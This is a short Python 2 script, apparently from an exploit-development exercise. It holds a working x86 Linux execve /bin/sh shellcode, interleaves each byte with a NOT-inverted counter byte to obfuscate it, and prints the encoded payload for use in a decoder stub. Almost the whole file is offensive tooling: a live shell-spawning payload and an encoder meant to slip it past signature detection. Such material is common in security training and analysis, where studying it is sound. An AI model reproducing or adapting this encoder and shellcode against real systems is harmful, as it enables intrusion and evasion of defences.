#!/usr/bin/python

# Python Insertion Encoder Generator 

# Funtion performs not operation (as long as shellcode < 255 bytes)
def not_bit(hexString):
	num_to_not = eval(hexString)
	return hex(255 - num_to_not)

# Execve shellcode which runs /bin/sh
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# Initialising empty string and number
encoded = ""
num = 1

print 'Encoded shellcode ...'

# Insert hex sequence 01, 02, 03 etc between bytes of shellcode, and perform bitwise NOT operation prior to inserting
for byte in bytearray(shellcode) :

	hexInsert = not_bit("{0:#0{1}x}".format(num,4))
	encoded += '0x%02x,' % byte
	encoded += hexInsert + ","
	num += 1

# Print encoded shellcode with 0xaa twice on end to denote end of shellcode
print encoded + "0xaa,0xaa"

print 'Len: %d' % len(bytearray(shellcode))
